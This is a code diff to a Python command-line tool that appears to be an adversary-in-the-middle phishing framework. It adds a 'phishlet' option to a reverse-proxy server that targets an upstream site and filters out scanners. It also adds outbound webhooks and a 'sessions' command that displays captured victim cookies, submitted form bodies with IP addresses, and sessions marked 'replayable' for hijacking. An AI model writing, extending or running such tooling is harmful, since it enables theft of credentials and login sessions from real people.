@@ -7,7 +7,7 @@ import os
 from typing import Any
 
 from .cli_core import _as_list, _beacon_exec, _num, emit_json, err, ok, text
-from .util import json_dumps, new_token, resolve_secret, run_async
+from .util import c_dim, json_dumps, new_token, resolve_secret, run_async
 
 
 class DeliveryCommands:
@@ -24,6 +24,7 @@ class DeliveryCommands:
             base_url=str(self.flags.get("url", "")),
             filter_scanners=bool(self.flags.get("filter", False)),
             upstream=str(self.flags.get("upstream", "")),
+            phishlet=str(self.flags.get("phishlet", "")),
         )
         run_async(
             server.serve_forever(
@@ -31,6 +32,67 @@ class DeliveryCommands:
                 ssl_keyfile=self.flags.get("key"),
             )
         )
+
+    # ─── outbound webhooks ───
+
+    def cmd_webhook(self) -> None:
+        self._need(2, "webhook add|list|remove <url>")
+        action, url = self.pos[1].lower(), self.pos[2] if len(self.pos) > 2 else ""
+        if action == "list":
+            urls = self.store.list_webhooks()
+            if not urls:
+                text("  (no webhooks — webhook add <url>)")
+                return
+            for u in urls:
+                text(f"  {u}")
+            return
+        if action == "add":
+            if not url:
+                raise SystemExit("webhook add <url>")
+            try:
+                self.store.add_webhook(url)
+            except ValueError as exc:
+                raise SystemExit(str(exc)) from None
+            ok(f"webhook added: {url}")
+            return
+        if action == "remove":
+            if not url:
+                raise SystemExit("webhook remove <url>")
+            if not self.store.remove_webhook(url):
+                raise SystemExit(f"no such webhook: {url}")
+            ok(f"webhook removed: {url}")
+            return
+        raise SystemExit(f"unknown action: {action}")
+
+    # ─── captured proxy sessions ───
+
+    def cmd_sessions(self) -> None:
+        self._need(1, "sessions [--limit N]")
+        rows = self.store.proxy_sessions(
+            limit=_num(self.flags, "limit", 40, int)
+        )
+        if not rows:
+            text("  (no captures — serve --upstream https://site.tld)")
+            return
+        for row in rows:
+            payload = row["payload"]
+            cookies = payload.get("cookies", {})
+            head = ", ".join(
+                f"{k}={str(v)[:18]}" for k, v in list(cookies.items())[:4]
+            )
+            icon = "🔑" if row["kind"] == "proxy:session" else "🍪"
+            if row["kind"] == "proxy:form":
+                body = str(payload.get("body", ""))[:80]
+                text(
+                    f"  ⌁ form  {payload.get('path', '')}  "
+                    f"{body}  {c_dim(payload.get('ip', ''))}"
+                )
+                continue
+            text(
+                f"  {icon} {row['kind'].split(':')[-1]}  "
+                f"{payload.get('host', '')}  [{head}]"
+                f"{'  ✅ replayable' if row['kind'] == 'proxy:session' else ''}"
+            )
 
     # ─── delivery ───
 
